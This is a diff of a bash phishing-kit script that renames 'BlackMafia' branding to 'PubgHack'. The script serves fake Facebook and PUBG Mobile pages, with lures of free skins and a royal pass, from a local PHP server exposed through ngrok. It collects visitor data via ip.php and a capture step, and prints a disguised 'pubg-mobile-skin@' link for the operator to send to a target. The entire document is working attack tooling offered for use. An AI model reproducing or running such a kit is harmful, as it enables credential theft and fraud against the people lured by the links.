@@ -38,7 +38,7 @@ reset_color() {
 }
 
 ## Kill already running process
-Black_Mafia() {
+PubgHack() {
 	if [[ `pidof php` ]]; then
 		killall php > /dev/null 2>&1
 	fi
@@ -69,7 +69,7 @@ ${ORANGE} ------ Co-founder, CEO of iran yousec -------●
 	EOF
 }
 ## Small Banner
-banner_mafia() {
+banner_pubg() {
 	cat <<- EOF
 ${ORANGE} 
 ${ORANGE} ████████████████████████████████████████████████ 
@@ -135,7 +135,7 @@ install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} BlackMafia Installing..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} PubgHack Installing..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip' 'ngrok'
@@ -151,7 +151,7 @@ install_ngrok() {
 	if [[ -e ".server/ngrok2" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok patch already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} BlackMafia Server Installing..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} PubgHack Server Installing..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip' 'ngrok2'
@@ -202,8 +202,8 @@ PORT='8080'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf BlackMafia404/"$website"/* .server/www
-	cp -f BlackMafia404/ip.php .server/www/
+	cp -rf pubg/"$website"/* .server/www
+	cp -f pubg/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
@@ -250,30 +250,30 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} PubgHack server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} $2"
 	sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &
-	{ sleep 8; clear; banner_mafia; }
+	{ sleep 8; clear; banner_pubg; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Send This link To The Target Orignal link: ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Send This link To The Target Edit link: ${GREEN}$mafia404@$ngrok_url1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Send This link To The Target Edit link: ${GREEN}$pubg@$ngrok_url1"
 	capture_data
 }
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia Server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} PubgHack Server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
-	{ sleep 1; clear; banner_mafia; }
+	{ sleep 1; clear; banner_pubg; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
 ## Tunnel selection
 tunnel_menu() {
-	{ clear; banner_mafia; }
+	{ clear; banner_pubg; }
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs Only${RED}]
@@ -309,19 +309,19 @@ ${RED}[${WHITE}03${RED}]${ORANGE} link Editor M416 Glacier
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="facebook"
-		mafia404='http://pubg-mobile-skin'
+		pubg='http://pubg-mobile-skin'
 		tunnel_menu
         elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 	        website="Pubg"
-		mafia404='http://pubg-mobile-royalpass'
+		pubg='http://pubg-mobile-royalpass'
 		tunnel_menu
         elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 	        website="Testing"
-		mafia404='http://pubg-mobile-glacier'
+		pubg='http://pubg-mobile-glacier'
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_mafia; lovehacker_facebook; }
+		{ sleep 1; clear; banner_pubg; lovehacker_facebook; }
 	fi
 }
 
